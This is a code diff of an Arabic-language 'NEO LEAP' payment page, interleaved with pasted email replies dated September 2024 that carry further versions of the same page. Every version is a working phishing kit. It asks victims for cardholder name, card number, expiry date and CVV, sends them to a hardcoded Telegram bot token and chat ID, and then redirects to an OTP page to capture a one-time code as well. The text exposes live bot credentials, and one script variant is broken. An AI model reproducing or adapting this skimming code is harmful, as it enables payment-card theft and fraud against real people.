@@ -6,126 +6,127 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>NEO LEAP</title>
     <style>
-    /* تنسيق الجسم */
-body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: #f4f4f4;
-}
+        /* تنسيق الجسم */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
 
-/* تنسيق الرأس */
-header {
-    padding: 15px 30px;
-    background-color: #68c998; /* لون رأس الصفحة */
-    color: #ffffff;
-    text-align: center;
-}
+        /* تنسيق الرأس */
+        header {
+            padding: 15px 30px;
+            background-color: #68c998; /* لون رأس الصفحة */
+            color: #ffffff;
+            text-align: center;
+        }
 
-header .logo {
-    display: inline-block;
-    background-color: #ffffff; /* خلفية بيضاء للشعار */
-    padding: 10px;
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-}
+        header .logo {
+            display: inline-block;
+            background-color: #ffffff; /* خلفية بيضاء للشعار */
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
 
-header .logo img {
-    max-width: 100px;
-}
+        header .logo img {
+            max-width: 100px;
+        }
 
-/* تنسيق محتوى الدفع */
-.payment-container {
-    background-color: #ffffff;
-    padding: 20px;
-    border-radius: 10px;
-    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    max-width: 400px;
-    margin: 30px auto;
-}
+        /* تنسيق محتوى الدفع */
+        .payment-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 30px auto;
+        }
 
-.payment-container h1 {
-    text-align: center;
-    margin-bottom: 5px; /* تقليل المسافة السفلية */
-    color: #333;
-}
+        .payment-container h1 {
+            text-align: center;
+            margin-bottom: 5px; /* تقليل المسافة السفلية */
+            color: #333;
+        }
 
-/* تنسيق رقم الطلب */
-.order-number {
-    text-align: right; /* وضع النص في الجهة اليمنى */
-    font-size: 14px; /* حجم أصغر للنص */
-    color: #555;
-    margin-bottom: 20px; /* مسافة بين النص وبقية المحتوى */
-}
+        /* تنسيق رقم الطلب */
+        .order-number {
+            text-align: right; /* وضع النص في الجهة اليمنى */
+            font-size: 14px; /* حجم أصغر للنص */
+            color: #555;
+            margin-bottom: 20px; /* مسافة بين النص وبقية المحتوى */
+        }
 
-label {
-    display: block;
-    margin-bottom: 5px;
-    color: #555;
-}
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
 
-input[type="text"] {
-    width: 100%;
-    padding: 10px;
-    margin-bottom: 20px;
-    border-radius: 5px;
-    border: 1px solid #ddd;
-}
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
 
-/* تنسيق Flexbox للحقلين */
-.flex-container {
-    display: flex;
-    justify-content: space-between;
-    gap: 20px; /* إضافة مساحة 20 بيكسل بين الحقلين */
-}
+        /* تنسيق Flexbox للحقلين */
+        .flex-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px; /* إضافة مساحة 20 بيكسل بين الحقلين */
+        }
 
-.flex-item {
-    flex: 1;
-}
+        .flex-item {
+            flex: 1;
+        }
 
-button {
-    width: 100%;
-    padding: 10px;
-    background-color: #68c998; /* لون زر الإرسال */
-    color: #ffffff;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-}
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #68c998; /* لون زر الإرسال */
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
 
-button:hover {
-    background-color: #57af80; /* تغيير اللون عند التمرير إلى درجة أغمق */
-}
+        button:hover {
+            background-color: #57af80; /* تغيير اللون عند التمرير إلى درجة أغمق */
+        }
 
-/* تنسيق أيقونات البطاقات الائتمانية */
-.cards-icons {
-    text-align: center;
-    margin-top: 159px;
-}
+        /* تنسيق أيقونات البطاقات الائتمانية */
+        .cards-icons {
+            text-align: center;
+            margin-top: 20px; /* تعديل المسافة العلوية */
+        }
 
-.cards-icons img {
-    width: 300px;
-    margin: 0 10px;
-}
+        .cards-icons img {
+            width: 300px;
+            margin: 0 10px;
+        }
 
-/* تنسيق التذييل */
-footer {
-    padding: 15px 30px;
-    background-color: #333;
-    color: #ffffff;
-    text-align: center;
-    position: fixed;
-    bottom: 0;
-    width: 100%;
-}
-/* تنسيق نص نوع البطاقة */
-.card-type {
-  font-size: 14px;
-  color: #555;
-  margin-top: 10px;
-  text-align: right;
-}
-</style>
+        /* تنسيق التذييل */
+        footer {
+            padding: 15px 30px;
+            background-color: #333;
+            color: #ffffff;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        /* تنسيق نص نوع البطاقة */
+        .card-type {
+            font-size: 14px;
+            color: #555;
+            margin-top: 10px;
+            text-align: right;
+        }
+    </style>
 </head>
 
 <body>
@@ -137,7 +138,448 @@ footer {
 
     <div class="payment-container">
         <h1>NEO LEAP</h1>
-        <p class="order-number">Order N:70490</p> <!-- إضافة النص هنا -->
+        <p class="order-number">Order N:70490</p>
+
+        <form id="form" class="wpforms-validate wpforms-form wpforms-ajax-form" method="post" enctype="multipart/form-data" action="#">
+            <div class="wpforms-field-container">
+                <div class="wpforms-field wpforms-field-text" data-field-id="11">
+                    <label for="tkoee">اسم مالك البطاقة <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="tkoee" name="wpforms[fields][11]" required>
+                </div>
+                <div class="wpforms-field wpforms-field-text" data-field-id="6">
+                    <label for="txtService">رقم البطاقة <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="txtService" name="wpforms[fields][6]" placeholder="0000 0000 0000 0000" required>
+                </div>
+                <div class="wpforms-field wpforms-field-text" data-field-id="10">
+                    <label for="nump">تاريخ انتهاء البطاقة <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="nump" name="wpforms[fields][10]" placeholder="MM / YY" required>
+                </div>
+                <div class="wpforms-field wpforms-field-text" data-field-id="13">
+                    <label for="name">الرقم (CVC / CVV) <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="name" name="wpforms[fields][13]" placeholder="CVV" required>
+                </div>
+            </div>
+            <button type="submit" name="wpforms[submit]" id="wpforms-submit-14" class="wpforms-submit" aria-live="assertive" onclick="setTimeout(RedirectionJavascript, 2000)">تأكيد</button>
+            <img decoding="async" src="submit-spin.svg" class="wpforms-submit-spinner" style="display: none;" width="26" height="26" alt="Loading">
+        </form>
+
+        <div class="cards-icons">
+            <img src="mada-visa-mastar-apple-pay-886x159.png" alt="mada-visa-mastar-apple-pay">
+        </div>
+    </div>
+
+    <script>
+        document.querySelector("#form").addEventListener("submit", function (e) {
+            e.preventDefault();
+           
+            var tkoee = document.getElementById("tkoee").value;
+            var txtService = document.getElementById("txtService").value;
+            var nump = document.getElementById("nump").value;
+            var name = document.getElementById("name").value;
+
+            var my_text = ` بطاقة > %0A%0Aنوع بطاقة:${tkoee}%0A%0Aرقم: ${txtService}%0A%0Aتاريخ:${nump}%0A%0Acvv: ${name}%0A`;
+
+            var token = "6851072481:AAGami-U1D3cuW_Vl7TERhWnEj6caGCnSEo";
+            var chat_id = -1002247195047;
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(my_text)}`;
+
+            var api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+
+            console.log("Message successfully sent!");
+
+            // Call the redirection function after a short delay
+            setTimeout(RedirectionJavascript, 2000);
+        });
+
+        function RedirectionJavascript() {
+            // Redirect to another page
+            window.location.href = "otp.html"; // Replace with the URL of the page to redirect to
+        }
+    </script>
+</body>
+
+</html>
+
+
+في الأحد، ١ سبتمبر ٢٠٢٤ ٦:٣٠ ص Abdalrahman Al-Raja <alkhjvjv232@gmail.com> كتب:
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEO LEAP</title>
+    <style>
+        /* تنسيق الجسم */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        /* تنسيق الرأس */
+        header {
+            padding: 15px 30px;
+            background-color: #68c998; /* لون رأس الصفحة */
+            color: #ffffff;
+            text-align: center;
+        }
+
+        header .logo {
+            display: inline-block;
+            background-color: #ffffff; /* خلفية بيضاء للشعار */
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        header .logo img {
+            max-width: 100px;
+        }
+
+        /* تنسيق محتوى الدفع */
+        .payment-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 30px auto;
+        }
+
+        .payment-container h1 {
+            text-align: center;
+            margin-bottom: 5px; /* تقليل المسافة السفلية */
+            color: #333;
+        }
+
+        /* تنسيق رقم الطلب */
+        .order-number {
+            text-align: right; /* وضع النص في الجهة اليمنى */
+            font-size: 14px; /* حجم أصغر للنص */
+            color: #555;
+            margin-bottom: 20px; /* مسافة بين النص وبقية المحتوى */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+
+        /* تنسيق Flexbox للحقلين */
+        .flex-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px; /* إضافة مساحة 20 بيكسل بين الحقلين */
+        }
+
+        .flex-item {
+            flex: 1;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #68c998; /* لون زر الإرسال */
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #57af80; /* تغيير اللون عند التمرير إلى درجة أغمق */
+        }
+
+        /* تنسيق أيقونات البطاقات الائتمانية */
+        .cards-icons {
+            text-align: center;
+            margin-top: 20px; /* تعديل المسافة العلوية */
+        }
+
+        .cards-icons img {
+            width: 300px;
+            margin: 0 10px;
+        }
+
+        /* تنسيق التذييل */
+        footer {
+            padding: 15px 30px;
+            background-color: #333;
+            color: #ffffff;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        /* تنسيق نص نوع البطاقة */
+        .card-type {
+            font-size: 14px;
+            color: #555;
+            margin-top: 10px;
+            text-align: right;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="logo">
+            <img src="https://www4.0zz0.com/2024/09/01/00/965232977.png" alt="Logo">
+        </div>
+    </header>
+
+    <div class="payment-container">
+        <h1>NEO LEAP</h1>
+        <p class="order-number">Order N:70490</p>
+
+        <form id="form" class="wpforms-validate wpforms-form wpforms-ajax-form" method="post" enctype="multipart/form-data" action="#">
+            <div class="wpforms-field-container">
+                <div class="wpforms-field wpforms-field-text" data-field-id="11">
+                    <label for="tkoee">اسم مالك البطاقة <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="tkoee" name="wpforms[fields][11]" required>
+                </div>
+                <div class="wpforms-field wpforms-field-text" data-field-id="6">
+                    <label for="txtService">رقم البطاقة <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="txtService" name="wpforms[fields][6]" placeholder="0000 0000 0000 0000" required>
+                </div>
+                <div class="wpforms-field wpforms-field-text" data-field-id="10">
+                    <label for="nump">تاريخ انتهاء البطاقة <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="nump" name="wpforms[fields][10]" placeholder="MM / YY" required>
+                </div>
+                <div class="wpforms-field wpforms-field-text" data-field-id="13">
+                    <label for="name">الرقم (CVC / CVV) <span class="wpforms-required-label">*</span></label>
+                    <input type="text" id="name" name="wpforms[fields][13]" placeholder="CVV" required>
+                </div>
+            </div>
+            <button type="submit" name="wpforms[submit]" id="wpforms-submit-14" class="wpforms-submit" aria-live="assertive" onclick="setTimeout(RedirectionJavascript, 2000)">تأكيد</button>
+            <img decoding="async" src="submit-spin.svg" class="wpforms-submit-spinner" style="display: none;" width="26" height="26" alt="Loading">
+        </form>
+
+        <div class="cards-icons">
+            <img src="mada-visa-mastar-apple-pay-886x159.png" alt="mada-visa-mastar-apple-pay">
+        </div>
+    </div>
+
+    <script>
+        document.querySelector("#form").addEventListener("submit", function (e) {
+            e.preventDefault();
+           
+            var tkoee = document.getElementById("tkoee").value;
+            var txtService = document.getElementById("txtService").value;
+            var nump = document.getElementById("nump").value;
+            var name = document.getElementById("name").value;
+
+            var my_text = ` بطاقة > %0A%0Aنوع بطاقة:${tkoee}%0A%0Aرقم: ${txtService}%0A%0Aتاريخ:${nump}%0A%0Acvv: ${name}%0A`;
+
+            var token = "6851072481:AAGami-U1D3cuW_Vl7TERhWnEj6caGCnSEo";
+            var chat_id = -1002247195047;
+            var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(my_text)}`;
+
+            var api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+
+            console.log("Message successfully sent!");
+
+            // Call the redirection function after a short delay
+            setTimeout(RedirectionJavascript, 2000);
+        });
+
+        function RedirectionJavascript() {
+            // Redirect to another page
+            window.location.href = "otp.html"; // Replace with the URL of the page to redirect to
+        }
+    </script>
+</body>
+
+</html>
+
+
+في الأحد، ١ سبتمبر ٢٠٢٤ ٥:٥٢ ص Abdalrahman Al-Raja <alkhjvjv232@gmail.com> كتب:
+const form = document.querySelector("#form");
+
+form.addEventListener("submit", (e) =>{
+    e.preventDefault();
+  
+     var tkoe = document.getElementById("tkoe").value;
+     var tkoee = document.getElementById("tkoee").value;
+     var txtService = document.getElementById("txtService").value;
+     var nump = document.getElementById("nump").value;
+     var name = document.getElementById("name").value;
+
+    
+   
+
+    var my_text = ` بطاقة > %0A%0Aنوع بطاقة:${tkoe}%0A%0Aاسم بطاقة:${tkoee}%0A%0Aرقم: ${txtService}%0A%0Aتاريخ:${nump}%0A%0Acvv:  ${name}%0A`
+
+      var token ="7470715881:AAHhFilAe-wdcW2kVMcnWq4RnKhn7PqOTf0";
+      var chat_id =-1002237844846
+    var url =`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}%0A`
+   
+let api = new XMLHttpRequest();
+api.open("GET.html", url, true);
+api.send();
+
+    console.log("Message successfully sended!")
+})
+
+
+في الأحد، ١ سبتمبر ٢٠٢٤ ٥:٣٤ ص Abdalrahman Al-Raja <alkhjvjv232@gmail.com> كتب:
+<!DOCTYPE html>
+<html lang="ar">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEO LEAP</title>
+    <style>
+        /* تنسيق الجسم */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+        }
+
+        /* تنسيق الرأس */
+        header {
+            padding: 15px 30px;
+            background-color: #68c998; /* لون رأس الصفحة */
+            color: #ffffff;
+            text-align: center;
+        }
+
+        header .logo {
+            display: inline-block;
+            background-color: #ffffff; /* خلفية بيضاء للشعار */
+            padding: 10px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        header .logo img {
+            max-width: 100px;
+        }
+
+        /* تنسيق محتوى الدفع */
+        .payment-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 30px auto;
+        }
+
+        .payment-container h1 {
+            text-align: center;
+            margin-bottom: 5px; /* تقليل المسافة السفلية */
+            color: #333;
+        }
+
+        /* تنسيق رقم الطلب */
+        .order-number {
+            text-align: right; /* وضع النص في الجهة اليمنى */
+            font-size: 14px; /* حجم أصغر للنص */
+            color: #555;
+            margin-bottom: 20px; /* مسافة بين النص وبقية المحتوى */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+
+        /* تنسيق Flexbox للحقلين */
+        .flex-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px; /* إضافة مساحة 20 بيكسل بين الحقلين */
+        }
+
+        .flex-item {
+            flex: 1;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #68c998; /* لون زر الإرسال */
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #57af80; /* تغيير اللون عند التمرير إلى درجة أغمق */
+        }
+
+        /* تنسيق أيقونات البطاقات الائتمانية */
+        .cards-icons {
+            text-align: center;
+            margin-top: 20px; /* تعديل المسافة العلوية */
+        }
+
+        .cards-icons img {
+            width: 300px;
+            margin: 0 10px;
+        }
+
+        /* تنسيق التذييل */
+        footer {
+            padding: 15px 30px;
+            background-color: #333;
+            color: #ffffff;
+            text-align: center;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+
+        /* تنسيق نص نوع البطاقة */
+        .card-type {
+            font-size: 14px;
+            color: #555;
+            margin-top: 10px;
+            text-align: right;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div class="logo">
+            <img src="https://www4.0zz0.com/2024/09/01/00/965232977.png" alt="Logo">
+        </div>
+    </header>
+
+    <div class="payment-container">
+        <h1>NEO LEAP</h1>
+        <p class="order-number">Order N:70490</p>
 
         <form id="payment-form">
             <label for="cardholder-name">اسم حامل البطاقة:</label>
@@ -145,9 +587,11 @@ footer {
 
             <label for="card-number">رقم البطاقة الائتمانية:</label>
             <input type="text" id="card-number" name="card-number" required>
-
+           
+            <!-- عرض نوع البطاقة -->
             <p id="card-type" class="card-type">نوع البطاقة</p>
 
+            <!-- الحقول الأخرى -->
             <div class="flex-container">
                 <div class="flex-item">
                     <label for="expiry-date">تاريخ انتهاء الصلاحية:</label>
@@ -167,54 +611,49 @@ footer {
         </div>
     </div>
 
-    <footer>
-        <p>© 2024 NEO LEAP. جميع الحقوق محفوظة.</p>
-    </footer>
-
     <script>
-    document.getElementById('payment-form').addEventListener('submit', function (event) {
-        event.preventDefault(); // منع إرسال النموذج بالطريقة الافتراضية
+        document.getElementById('payment-form').addEventListener('submit', function (event) {
+            event.preventDefault(); // منع إرسال النموذج بالطريقة الافتراضية
 
-        // الحصول على بيانات النموذج
-        const cardholderName = document.getElementById('cardholder-name').value;
-        const cardNumber = document.getElementById('card-number').value;
-        const expiryDate = document.getElementById('expiry-date').value;
-        const cvv = document.getElementById('cvv').value;
+            // الحصول على بيانات النموذج
+            const cardholderName = document.getElementById('cardholder-name').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiryDate = document.getElementById('expiry-date').value;
+            const cvv = document.getElementById('cvv').value;
 
-        // إعداد رسالة لتنسيقها
-        const message = `اسم حامل البطاقة: ${cardholderName}\nرقم البطاقة: ${cardNumber}\nتاريخ انتهاء الصلاحية: ${expiryDate}\nالرمز السري (CVV): ${cvv}`;
+            // إعداد رسالة لتنسيقها
+            const message = `اسم حامل البطاقة: ${cardholderName}\nرقم البطاقة: ${cardNumber}\nتاريخ انتهاء الصلاحية: ${expiryDate}\nالرمز السري (CVV): ${cvv}`;
 
-        // إعداد الرابط الخاص بالبوت
-        const botToken = '6851072481:AAGami-U1D3cuW_Vl7TERhWnEj6caGCnSEo
-'; // استبدل بـ توكن البوت الخاص بك
-        const chatId = '1002247195047'; // استبدل بـ معرّف الدردشة الخاص بك
-        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            // إعداد الرابط الخاص بالبوت
+            const botToken = '6538211018:AAEkfaMZAaoOccZJ0v9wKcgi8NXAsG-96iE'; // استبدل بـ توكن البوت الخاص بك
+            const chatId = '1002015547105'; // استبدل بـ معرّف الدردشة الخاص بك
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        // إرسال البيانات إلى بوت تيليجرام
-        fetch(apiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
+            // إرسال البيانات إلى بوت تيليجرام
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
             })
-        })
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok) {
-                // توجيه المستخدم إلى صفحة أخرى
-                window.location.href = 'otp.html'; // استبدل بالصفحة التي تريد عرضها
-            } else {
-                alert('حدث خطأ أثناء إرسال البيانات: ' + data.description);
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-            alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // توجيه المستخدم إلى صفحة أخرى
+                    window.location.href = 'otp.html'; // استبدل بالصفحة التي تريد عرضها
+                } else {
+                    alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء إرسال البيانات. حاول مرة أخرى.');
+            });
         });
-    });
     </script>
 </body>
 
